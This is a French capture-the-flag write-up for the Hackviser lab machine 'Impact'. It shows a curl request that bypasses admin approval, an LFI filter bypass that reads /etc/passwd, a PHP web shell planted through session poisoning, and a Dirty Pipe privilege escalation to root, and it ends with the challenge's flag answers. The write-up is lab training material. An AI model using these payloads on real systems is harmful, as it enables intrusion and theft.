# Write-up : Impact - Hackviser

Ce document récapitule l'exploitation complète de la machine **Impact** sur la plateforme Hackviser, classée en difficulté **Medium**.

---

## 🚩 Informations Générales

- **Cible** : `http://impact.hv` (IP à mapper dans `/etc/hosts`)
- **Services ouverts** : SSH (22), HTTP (80)

---

## 🛠️ Phase 1 : Reconnaissance et Accès Initial

### Identification du vecteur d'entrée

Le site propose une page d'accueil avec des fonctionnalités de login (`login.php`) et d'inscription (`register.php`). L'énumération par dictionnaire révèle également l'existence d'un dossier `/webadmin/` protégé mais fuyant des informations.

### Vulnérabilité 1 : IDOR / Broken Access Control (Contournement de validation Admin)

Après s'être inscrit normalement, le compte reste "en attente de validation par l'administrateur".
En analysant les requêtes ou le code source, on découvre le script `sendFile.php`, chargé de valider les demandes. Ce script ne vérifie pas les permissions de l'utilisateur.

**Exploitation :**
On peut s'auto-approuver en envoyant une requête POST directe :

```bash
curl -X POST -d "username=<votre_username>" http://impact.hv/sendFile.php
```

Le compte est alors activé, donnant accès au profil utilisateur et aux bases de données fuitées.

**Réponses obtenues :**

- **Wallet Crypto** : Présent sur le tableau de bord une fois connecté.
- **Domains fuités** : `vertextechnologies.hv`, `nebuladynamics.hv`, `aurorasolutions.hv`.

---

## 📂 Phase 2 : Local File Inclusion (LFI)

Une vulnérabilité de type LFI est présente sur `search.php`. Le paramètre `name` attend une chaîne encodée en **Base64**.
Le serveur tente de filtrer les remontées de répertoire en supprimant `../`.

**Contournement du filtre :**
Le filtre est contournable avec la séquence `....//` (qui devient `../` après le passage du filtre).

```bash
# Exemple pour lire /etc/passwd :
# Chaine : ....//....//....//....//....//etc/passwd 
# Encoded : Li4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA==
curl "http://impact.hv/search.php?name=Li4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA=="
```

**Information extraite :**
En lisant le code source de l'admin panel via LFI (`....//webadmin/index.php`), on récupère :

- **Email de l'Admin** : `zerotrace@secretmail.hv`.

---

## 💻 Phase 3 : Remote Code Execution (RCE) via Session Poisoning

L'objectif est d'exécuter du code arbitraire pour fouiller le système.

**Méthodologie :**

1. Créer un utilisateur avec un nom contenant du code PHP : `<?php system($_POST['cmd']); ?>`.
2. S'auto-approuver et se connecter. PHP crée un fichier de session dans `/var/lib/php/sessions/sess_<PHPSESSID>` contenant ce nom.
3. Utiliser la LFI pour inclure le fichier de session. Le serveur interprète alors notre code.

**Exploitation :**

```bash
# Appel du shell via LFI (le PHPSESSID est celui de votre cookie actuel)
curl -d "cmd=id" "http://impact.hv/search.php?name=<Base64_Sess_Path>"
```

**Découverte de la cible masquée :**
En listant le dossier de l'utilisateur système `impact` (`ls -la /home/impact/`), on trouve le fichier `targets.txt`.

- **Dernière cible classée (Last ranked website)** : `paramountpartners.hv`.

---

## 👑 Phase 4 : Élévation de Privilèges (ROOT)

L'énumération système via le RCE (`uname -a`) montre un noyau **Linux 5.11**. Ce kernel est vulnérable à la faille **Dirty Pipe (CVE-2022-0847)**.

**Exploitation :**

1. Téléchargement et compilation de l'exploit `exploit-2.c` (Dirty Pipe hijacking SUID).
2. Hijack du binaire SUID `/usr/bin/passwd` pour créer un shell root dans `/tmp/sh`.
3. Accès au répertoire `/root`.

**Fichier final :**
Le fichier `/root/Chat.txt` contient une discussion entre les hackers.

- **Numéro de téléphone de l'Admin** : `+44 7520 123456`.

---

## 🏆 Recap des Flags / Réponses

1. **Crypto Wallet** : [Visible après login]
2. **Admin Email** : `zerotrace@secretmail.hv`
3. **Leaked Domain** : `vertextechnologies.hv` (entre autres)
4. **Last Target** : `paramountpartners.hv`
5. **Admin Phone** : `+44 7520 123456`

---
*Write-up généré le 2026-02-27 par .*
